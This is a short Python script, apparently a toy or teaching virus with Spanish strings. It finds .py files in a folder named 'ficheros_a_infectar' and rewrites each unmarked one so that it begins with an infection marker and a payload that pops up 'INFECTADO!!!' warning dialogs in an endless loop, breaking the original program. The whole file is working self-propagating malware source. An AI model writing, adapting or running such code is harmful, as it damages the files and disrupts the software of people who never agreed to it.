import glob

virus_str = '''
import tkinter as tk
from tkinter import messagebox

root = tk.Tk()
root.withdraw()
while True:
    messagebox.showwarning('Estas Infectado', 'INFECTADO!!!')
'''

infected_str = '##INFECTED##'
is_infected = False

files = glob.glob('ficheros_a_infectar/*py')

print(files)
for file in files:
    f = open(file, 'r')
    code = f.readlines()
    f.close()
    for line in code:
        if infected_str in line:
            is_infected = True
            break

    if not is_infected:
        new_f = open(file, 'w')
        new_f.write(infected_str + '\n')
        new_f.write(virus_str)
        new_f.writelines(code)
        new_f.close()